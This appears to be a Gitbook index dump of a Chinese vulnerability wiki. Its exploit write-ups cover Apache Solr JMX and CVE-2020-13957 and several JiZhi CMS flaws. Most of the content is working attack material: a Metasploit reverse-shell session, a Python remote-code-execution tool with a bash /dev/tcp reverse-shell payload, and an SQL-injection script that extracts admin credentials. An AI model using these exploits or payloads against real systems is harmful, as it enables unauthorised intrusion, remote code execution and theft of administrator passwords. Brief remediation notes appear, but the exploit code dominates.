exploits - 1108 auxiliary - 344 post ] + -- --=[ 562 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] Metasploit tip: Writing a custom module? After editing your module, why not try the reload command msf5 > use exploit/multi/misc/java_jmx_server [*] No payload configured, defaulting to java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > set rhost 192.168.51.146 rhost => 192.168.51.146 msf5 exploit(multi/misc/java_jmx_server) > set rport 18983 rport => 18983 msf5 exploit(multi/misc/java_jmx_server) > set payload java/meterpreter/reverse_tcp payload => java/meterpreter/reverse_tcp msf5 exploit(multi/misc/java_jmx_server) > options Module options (exploit/multi/misc/java_jmx_server): Name Current Setting Required Description ---- --------------- -------- ----------- JMXRMI jmxrmi yes The name where the JMX RMI interface is bound JMX_PASSWORD no The password to interact with an authenticated JMX endpoint JMX_ROLE no The role to interact with an authenticated JMX endpoint RHOSTS 192.168.51.146 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 18983 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) Payload options (java/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.51.149 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Generic (Java Payload) msf5 exploit(multi/misc/java_jmx_server) > run [*] Started reverse TCP handler on 192.168.51.149:4444 [*] 192.168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm [*] 192.168.51.146:18983 - Sending RMI Header... [*] 192.168.51.146:18983 - Discovering the JMXRMI endpoint... [+] 192.168.51.146:18983 - JMXRMI endpoint on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Proceeding with handshake... [+] 192.168.51.146:18983 - Handshake with JMX MBean server on 127.0.1.1:18983 [*] 192.168.51.146:18983 - Loading payload... [*] 192.168.51.146:18983 - Replied to request for mlet [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] 192.168.51.146:18983 - Executing payload... [*] 192.168.51.146:18983 - Replied to request for payload JAR [*] Sending stage (53944 bytes) to 192.168.51.146 [*] Meterpreter session 1 opened (192.168.51.149:4444 -> 192.168.51.146:56234) at 2020-11-05 14:17:04 +0800 meterpreter > meterpreter > shell Process 1 created. Channel 1 created. id 用户id=0(root) 组id=0(root) 组=0(root) 漏洞修复 将solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置为false，然后重启Solr服务。 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.html":{"url":"PeiQi_Wiki/web_serve_wiki/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.html","title":"Apache Solr RCE 未授权上传漏洞 CVE-2020-13957","keywords":"","body":"Apache Solr RCE 未授权上传漏洞 CVE-2020-13957 漏洞描述 在特定的Solr版本中ConfigSet API存在未授权上传漏洞，攻击者利用漏洞可实现远程代码执行。 影响版本 [!NOTE] Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2 环境搭建 选择一个存在漏洞的版本 下载各版本Solr地址 这里复现使用的是 Apache Solr 7.7.0 进行复现 下载后执行以下命令进行环境部署 cd solr-7.7.0 ./bin/solr start -e cloud -force 然后一路回车，直至出现 Created collection 'gettingstarted' with 2 shard(s), 2 replica(s) with config-set 'gettingstarted' Enabling auto soft-commits with maxTime 3 secs using the Config API POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config {\"set-property\":{\"updateHandler.autoSoftCommit.maxTime\":\"3000\"}} Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000 SolrCloud example running, please visit: http://localhost:8983/solr 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 在攻击机上下载目标版本的Solr,执行下列命令打包压缩文件 solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > vuln.zip 将 vuln.zip 进行上传 curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln\" [!NOTE] name参数为压缩包的文件名 利用漏洞创建一个 core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln\" [!NOTE] name参数为创建的core核心名 collection.configName参数为上传的文件名 查看core列表，发现已经成功创建 再使用 Apache Solr Velocity模板远程执行 CVE-2019-17558 即可执行任意命令 POC使用详情参考另一篇复现文章 漏洞利用POC [!NOTE] 使用前按复现步骤上传对应版本的zip文件，例如我这里上传的文件为 qwert.zip,其他使用方法与 Apache Solr Velocity模板远程执行 CVE-2019-17558 的POC使用方法类似 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr 6.6.0 -6.6.5 \\033[0m') print('+ \\033[34m Apache Solr 7.0.0 -7.7.3 \\033[0m') print('+ \\033[34m Apache Solr 8.0.0 -8.6.2 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2020-13957.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mZip >>> vuln.zip(Zip文件名) \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): core_name = str(input(\"\\033[35mPlease input Create Core Name\\nCore >>> \\033[0m\")) core_update = \"\"\"%s/solr/admin/collections?action=CREATE&name=%s&numShards=1&replicationFactor=1&wt=xml&collection.configName=%s\"\"\" % (target_url, core_name, file_name.replace(\".zip\",\"\")) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.get(url=core_update, headers=headers, timeout=30) if response.status_code != 200: print(\"\\033[31m[x] 创建Core失败 \\033[0m\") sys.exit(0) else: core = re.findall(r'(.*?)',response.text)[0] vuln_url = target_url + \"/solr/\" + core + \"/config\" print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core + \"/config\\033[0m\") return vuln_url,core def POC_2(target_url, core): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m\") else: print(\"\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m\") sys.exit(0) def POC_3(target_url, core, cmd): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m\") else: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) def POC_4(target_url, core, IP, PORT): # POC : /bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, PORT) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = str(input(\"\\033[35mPlease input File Name\\nZip >>> \\033[0m\")) vuln_url,core = POC_1(target_url, file_name) POC_2(target_url, core) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_4(target_url, core, IP, PORT) else: POC_3(target_url, core, cmd) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/cms_wiki/":{"url":"PeiQi_Wiki/cms_wiki/","title":"CMS漏洞","keywords":"","body":"CMS 漏洞整理👻 极致CMS 极致CMS 全版本任意文件上传(后台权限) 极致CMS 存储型XSS 极致CMS 极致cms 1.71,1.7,1.67 版本 支付插件SQL注入 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/","title":"极致CMS","keywords":"","body":"极致CMS 极致CMS 全版本任意代码执行(后台权限) 极致CMS 1.71 ,1.7 ,1.67 版本 支付插件sql注入 极致CMS PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS_全版本任意文件上传.html":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS_全版本任意文件上传.html","title":"极致CMS 任意文件上传(后台权限)","keywords":"","body":"极致CMS_全版本任意文件(后台) 登陆后台查看插件处，有一个后台编辑的插件 安装之后设置密码并使用 [!NOTE] 如果已经设有密码，重新安装插件即可解决密码未知问题 修改为php代码 成功执行php代码的命令 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS_1.71_1.7_1.67版本sql注入.html":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS_1.71_1.7_1.67版本sql注入.html","title":"极致CMS 1.71 + 1.7 + 1.67 版本sql注入","keywords":"","body":"极致CMS_1.71_1.7_1.67版本sql注入(支付插件) 查看一下进行过滤的函数 /** 参数过滤，格式化 **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://整数 return (int)$value; case 1://字符串 $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://数组 if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://浮点 return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //过滤XSS攻击 function SafeFilter(&$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key => $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 } else { SafeFilter($arr[$key]); } } } } 看一下执行的SQL语句的函数 // 查询一条 public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } 跟进 findAll 函数 // 查询所有 public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key => $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this->table} {$where}\"; return $this->getData($sql); } 在跟进一下getData函数 //获取数据 public function getData($sql) { if(!$result = $this->query($sql))return array(); if(!$this->Statement->rowCount())return array(); $rows = array(); while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){} $this->Statement=null; array_pop($rows); return $rows; } 跟进query执行函数 //执行SQL语句并检查是否错误 public function query($sql){ $this->filter[] = $sql; $this->Statement = $this->pdo->query($sql); if ($this->Statement) { return $this; }else{ $msg = $this->pdo->errorInfo(); if($msg[2]) exit('数据库错误：' . $msg[2] . end($this->filter)); } } 看到$msg = $this->pdo->errorInfo();语句，也就是说会把数据库报错信息打印在页面上并显示出来并退出 一套分析下来没有发现对sql语句的过滤，如果得到的数据没有经过format_param过滤，会产生注入 例如: function exploit(){ M('member')->find(['username'=>$_GET['name']]); } 如果直接这样GET POST REQUEST 带入数据库 会产生报错注入 例如 ./exploit/name=123' (加一个引号会报错，如果引号没过滤) 现在只需要寻找类型是这样没过滤直接带入数据库的语句就行了 简单寻找下其实这样的地方挺多的，拿一个位置举例子 这里是一个支付插件的位置，蓝色方块1增加代码模拟开通支付宝功能通过验证 可以看到这个函数只使用[htmlspecialchars]来过滤了xss，sql语句没有过滤，用刚刚的方法来注入 可以看到的确出现了sql语句和数据库错误 直接报错注入获取敏感信息mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" 官网url : https://www.jizhicms.cn/ \"\"\" def main(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 极致CMS 1.67 - 171 \\033[0m') print('+ \\033[36m使用格式: python3 CNVD-2020-49710.py \\033[0m') print('+------------------------------------------') while True: poc = str(input('选择使用的poc：\\n' '1.sql注入\\n' '2.用户购物车爆破\\n' '3.GET 网站管理员账号密码\\n' '4.退出 quit\\n' 'poc:')) print('------------------ peiqi -----------------------') if poc == '1': poc_1() elif poc == '2': poc_2() elif poc == '3': poc_3() elif poc == '4': break else: print('参数错误，重新输入') def poc_1(): ## poc_1 ---> sql注入漏洞点( Home/c/MypayController.php [alipay_notify_pay]) ## 使用范围 极致cms 1.71 + 1.7 + 1.67 版本 \"\"\" function alipay_return_pay(){ extendFile('pay/alipay/AlipayServiceCheck.php'); //支付宝公钥，账户中心->密钥管理->开放平台密钥，找到添加了支付功能的应用，根据你的加密类型，查看支付宝公钥 $alipayPublicKey=$this->webconf['alipay_public_key']; $aliPay = new \\AlipayServiceCheck($alipayPublicKey); //验证签名 $result = $aliPay->rsaCheck($_GET,$_GET['sign_type']); $result=true; 付款成功'; $out_trade_no = htmlspecialchars($_GET['out_trade_no']); find(['orderno'=>$orderno]); 发布时间 2020-05-25]') else: print('得到的数据为:\\n', data) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html def poc_2(): ## poc_2 ---> 用户购物车页面获取 (Home/c/UserController.php [orderdetails]) ## 漏洞点 ---> 无用户cookie id 的验证 ## 使用范围 极致cms 1.8以下全版本 (当前最新 v1.8 更新时间:6月30日) \"\"\" function orderdetails(){ $orderno = $this->frparam('orderno',1); $order = M('orders')->find(['orderno'=>$orderno]); if($orderno && $order){ /* if($order['isshow']!=1){ //超时或者已支付 if($order['isshow']==0){ $msg = '订单已删除'; } if($order['isshow']==3){ $msg = '订单已过期，不可支付！'; } if($order['isshow']==2){ $msg = '订单已支付，请勿重复操作！'; } if($this->frparam('ajax')){ JsonReturn(['code'=>1,'msg'=>$msg]); } Error($msg); } */ $carts = explode('||',$order['body']); $new = []; foreach($carts as $k=>$v){ $d = explode('-',$v); if($d[0]!=''){ //兼容多模块化 if(isset($this->classtypedata[$d[0]])){ $type = $this->classtypedata[$d[0]]; $res = M($type['molds'])->find(['id'=>$d[1]]); $new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; }else{ $new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; } } } $this->carts = $new; $this->order = $order; $this->display($this->template.'/user/orderdetails'); } } \"\"\" try: exploit_url = str(input(\"攻击网站url：\\n\")) year_day = str(input(\"输入日期(例如:20200712):\")) shop = [] # 遍历所有出现的用户购物车页面 for num in range(100000,999999): #payload_url = \"user/orderdetails/orderno/No\" + year_day + str(num) + \".html\" payload_url = \"user/orderdetails/orderno/No20200712213927.html\" response = requests.get(exploit_url + payload_url) # 打印结果 if '总金额' in response.text: print('购物车页面：',payload_url) shop.append(payload_url) for page in shop: print(page) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') def poc_3(): ## poc_3 ---> 得到账号密码 ( Home/c/MypayController.php [alipay_notify_pay]) ## 使用范围 ---> 极致cms 1.71 + 1.7 + 1.67 版本 try: exploit_url = str(input(\"攻击网站url：\\n\")) # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+ # 用户名 + 密码 长度 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) str_long = re.search(r'~(.*?)~',response.text).group(1) #print(str_long) # 得到账号密码，密码md5格式 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_1 = re.search(r\"~#(.*?)'\", response.text).group(1) #print(admin_name_1) payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,\" + str(int(str_long) - 32) +\") from jz_level limit 0,1),0x7e),1)--+\" response = requests.get(payload_url) admin_name_2 = re.search(r'~(.*?)~', response.text).group(1) #print(admin_name_2) # 分割账号密码 admin_passwd = admin_name_1 + admin_name_2 admin_passwd = admin_passwd.split(':') admin = admin_passwd[0] passwd = admin_passwd[1] #print(admin) #print(passwd) print(\"成功得到账号密码：\\n\" \"用户名:\",admin, \"\\n密码(md5):\",passwd) print('------------------ peiqi -----------------------') except: print('出现错误') print('------------------ peiqi -----------------------') if __name__ == '__main__': main() 购物车爆破没有利用点，关于审计部分参考极致CMS审计 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "},"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS 1.81以下版本 存储型XSS.html":{"url":"PeiQi_Wiki/cms_wiki/jizhi_cms/极致CMS 1.81以下版本 存储型XSS.html","title":"极致CMS <1.81 版本 存储型XSS","keywords":"","body":"极致CMS 1.81以下版本 存储型XSS 漏洞复现 登录管理员添加模块 注册用户 点击发布文章 在文章标题处插入xss payload 当管理员访问时XSS成功 参考 极致CMS代码审计 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2020-11-07 12:10:13 "}}